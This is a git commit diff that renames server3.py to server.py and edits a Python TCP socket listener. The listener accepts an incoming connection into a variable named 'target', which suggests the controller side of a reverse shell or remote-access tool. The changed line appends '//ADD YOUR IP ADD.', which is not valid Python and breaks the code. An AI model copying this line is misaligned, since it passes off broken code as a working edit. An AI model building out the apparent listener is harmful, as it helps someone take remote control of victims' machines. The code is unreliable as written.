2a24f9e6948120f64571802ba9ae2f717e02d90d
Hackshu <60186087+Hackshu@users.noreply.github.com>
2021-10-17 15:45:08 +0530

    Update and rename server3.py to server.py

--- server.py
+++ server.py
@@ -63,7 +63,7 @@ def server():
     global target
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("192.168.43.147", 54321))
+    s.bind(("192.168.43.147", 54321))//ADD YOUR IP ADD.
     s.listen(5)
     print("connection listening")
     target, ip = s.accept()
